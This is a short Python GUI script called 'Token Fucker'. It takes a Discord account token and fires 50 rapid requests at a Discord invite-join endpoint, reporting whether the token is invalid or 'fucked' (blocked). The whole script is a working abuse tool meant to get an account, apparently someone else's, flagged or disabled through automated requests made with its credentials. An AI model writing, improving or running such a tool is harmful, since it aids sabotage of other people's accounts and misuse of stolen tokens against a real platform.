import tkinter as tk
import requests

from tkinter import Entry, Button, Label

window = tk.Tk()
token = None

window.title("Token Fucker")
window.geometry('250x100')
window.configure(bg="black")
window.resizable(width=False, height=False)
e = Entry(window, width=20)
e.pack()

statustxt = tk.StringVar()
statustxt.set("Insert Token and click the Button")

status = Label(window, textvariable=statustxt, bg="black", fg="white")
status.pack()

def token_fucker():
    headers = {
        'Authorization': e.get()
    }
    print("fucking token...")
    for x in range(50):
        back = requests.post(url='https://discordapp.com/api/v6/invite/r3sSKJJ', headers=headers)
        if back.status_code == 401:
            statustxt.set("Token Invalid!")
            return
        if back.status_code == 403:
            statustxt.set("Token Fucked!")
            return


enter = Button(window, text="Fuck Token", command=token_fucker)
enter.pack()

window.mainloop()